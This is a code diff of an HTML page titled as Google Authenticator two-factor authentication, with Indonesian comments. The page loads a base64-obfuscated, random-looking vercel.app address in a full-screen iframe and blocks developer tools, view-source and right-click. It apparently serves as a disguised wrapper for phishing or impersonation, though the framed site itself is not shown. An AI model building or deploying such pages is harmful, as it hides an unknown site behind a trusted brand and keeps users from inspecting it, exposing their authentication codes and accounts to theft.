@@ -19,8 +19,6 @@
 
   <title>Two-Factor Authentication - Google Authenticator</title>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
-
   <style>
     body, html {
       margin: 0;
@@ -36,37 +34,95 @@
       height: 100vh;
       border: none;
     }
+
+    /* Tombol refresh manual */
+    .refresh-btn {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: rgba(255, 255, 255, 0.8);
+      color: #000;
+      border: none;
+      padding: 10px 15px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      z-index: 1000;
+    }
+
+    .refresh-btn:hover {
+      background-color: rgba(255, 255, 255, 1);
+    }
   </style>
+</head>
+
+<body>
+
+  <!-- Iframe dengan izin copy & clipboard -->
+  <iframe id="iframe" sandbox="allow-scripts allow-same-origin allow-modals allow-forms" allowfullscreen></iframe>
+
+  <!-- Tombol Refresh Manual -->
+  <button class="refresh-btn" onclick="reloadIframe()">🔄 Refresh</button>
 
   <script>
-    document.addEventListener('keydown', function(event) {
+    // Mengatur URL iframe dari base64 untuk keamanan
+    window.onload = function () {
+      var iframeUrl = atob('aHR0cHM6Ly9mYXN0MmZhamhqc2ZoajM4eWZhYmhmYWhnaHZhZnl1M3NhMjJmZmZhYXZhdS52ZXJjZWwuYXBwLw==');
+      document.getElementById('iframe').src = iframeUrl;
+    };
+
+    // Fungsi untuk merefresh iframe tanpa reload seluruh halaman
+    function reloadIframe() {
+      let iframe = document.getElementById('iframe');
+      iframe.src = iframe.src; // Menyetel ulang sumber untuk refresh iframe
+    }
+
+    // Mencegah pull-to-refresh di Android
+    let touchStartY = 0, touchEndY = 0;
+    document.addEventListener('touchstart', function (event) {
+      touchStartY = event.touches[0].clientY;
+    });
+
+    document.addEventListener('touchmove', function (event) {
+      touchEndY = event.touches[0].clientY;
+
+      // Cegah refresh jika swipe ke bawah dari atas halaman
+      if (window.scrollY === 0 && touchEndY > touchStartY) {
+        event.preventDefault();
+      }
+    }, { passive: false });
+
+    // Double-tap untuk refresh iframe
+    let lastTap = 0;
+    document.addEventListener('touchend', function (event) {
+      let currentTime = new Date().getTime();
+      let tapLength = currentTime - lastTap;
+
+      if (tapLength < 300 && tapLength > 0) {
+        reloadIframe(); // Refresh iframe jika double-tap
+      }
+
+      lastTap = currentTime;
+    });
+
+    // Mencegah inspeksi elemen & klik kanan
+    document.addEventListener('keydown', function (event) {
       if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && event.key === 'I') || (event.ctrlKey && event.key === 'U')) {
         event.preventDefault();
       }
     });
 
-    document.addEventListener('contextmenu', function(event) {
+    document.addEventListener('contextmenu', function (event) {
       event.preventDefault();
     });
 
-    document.addEventListener('mousedown', function(event) {
+    document.addEventListener('mousedown', function (event) {
       if (event.button === 2) {
         event.preventDefault();
       }
     });
-
-    function loadIframe() {
-      var iframeUrl = atob('aHR0cHM6Ly9mYXN0MmZhamhqc2ZoajM4eWZhYmhmYWhnaHZhZnl1M3NhMjJmZmZhYXZhdS52ZXJjZWwuYXBwLw==');
-      document.getElementById('iframe').src = iframeUrl;
-    }
-
-    window.onload = loadIframe;
   </script>
 
-</head>
-
-<body>
-  <iframe id="iframe" allowfullscreen></iframe>
 </body>
 
 </html>
